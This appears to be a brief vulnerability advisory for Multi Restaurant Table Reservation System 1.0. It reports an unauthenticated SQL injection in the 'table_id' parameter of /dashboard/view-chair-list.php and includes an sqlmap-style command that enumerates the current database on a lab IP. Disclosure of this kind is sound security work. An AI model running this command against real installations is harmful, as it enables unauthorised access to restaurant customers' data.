# -Multi-Restaurant-Table-Reservation-System  
* Title: Multi Restaurant Table Reservation System 1.0 - 'table_id' Unauthenticated SQL Injection  
* Vendor Homepage: www.sourcecodester.com  
*  Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/tablereservation.zip  
* Version: 1.0  

* Description：  
The file view-chair-list.php does not perform input validation on the table_id parameter which allows unauthenticated SQL Injection.  
An attacker can send malicious input in the GET request to /dashboard/view-chair-list.php?table_id= to trigger the vulnerability.  

* sql payload:  
-u http://192.168.100.234//TableReservation/dashboard/view-chair-list.php?table_id=1 --batch --current-db  
![image](https://github.com/BigTiger2020/-Multi-Restaurant-Table-Reservation-System/blob/main/010.png)  
